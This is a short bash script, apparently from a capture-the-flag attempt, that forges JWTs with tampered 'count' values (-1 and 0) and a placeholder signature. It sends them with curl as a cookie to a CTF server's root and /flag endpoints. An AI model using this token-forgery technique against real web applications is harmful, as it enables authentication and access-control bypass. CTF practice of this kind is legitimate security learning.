#!/bin/bash

# Test JWT manipulation for Lower Numbers Challenge
cd "/Users/mac/VirtualBox VMs/CTF_chanllenge/challenges/lower_numbers_web"

echo "Testing JWT manipulation with negative count..."

# JWT with count=-1
# Header: {"alg":"HS256","typ":"JWT"} -> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
# Payload: {"count":-1} -> eyJjb3VudCI6LTF9

JWT_NEG1="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjb3VudCI6LTF9.fake_signature"

echo "Testing JWT with count=-1..."
curl -s -H "Cookie: d=$JWT_NEG1" "https://cpp.bootupctf.net:8085/" | head -5

echo -e "\nTrying to get flag with count=-1..."
curl -s -H "Cookie: d=$JWT_NEG1" "https://cpp.bootupctf.net:8085/flag"

# JWT with count=0
JWT_ZERO="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjb3VudCI6MH0.fake_signature"

echo -e "\n\nTesting JWT with count=0..."
curl -s -H "Cookie: d=$JWT_ZERO" "https://cpp.bootupctf.net:8085/" | head -5

echo -e "\nTrying to get flag with count=0..."
curl -s -H "Cookie: d=$JWT_ZERO" "https://cpp.bootupctf.net:8085/flag"
